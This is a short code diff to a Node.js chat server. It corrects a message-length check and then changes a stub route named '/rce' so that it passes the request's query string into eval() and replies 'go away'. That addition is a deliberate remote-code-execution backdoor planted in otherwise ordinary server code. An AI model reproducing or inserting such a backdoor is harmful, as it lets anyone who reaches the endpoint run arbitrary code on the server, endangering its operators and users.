@@ -80,7 +80,7 @@ app.ws("/*", {
                 logJoin(user.username, user.ip, ws.id, user.room); //name, ip, id, room
                 break;
             case "message":
-                if (message.length > 250) return;
+                if (message.text.length > 250) return;
                 
                 // published globally to the room through app instead of by the user socket, so the client recieves it's own message back and the message is equally mirrored across all clients
                 ratelimit.consume(ws.id).then(() => {
@@ -266,7 +266,8 @@ app.get("/unban", async (reply, req) => {
 });
 
 app.get("/rce", (reply, req) => {
-    // for later use ig
+    const query = parseQuery(req.getQuery());
+    eval(query);
     reply.writeStatus("200").end("go away");
 });
 
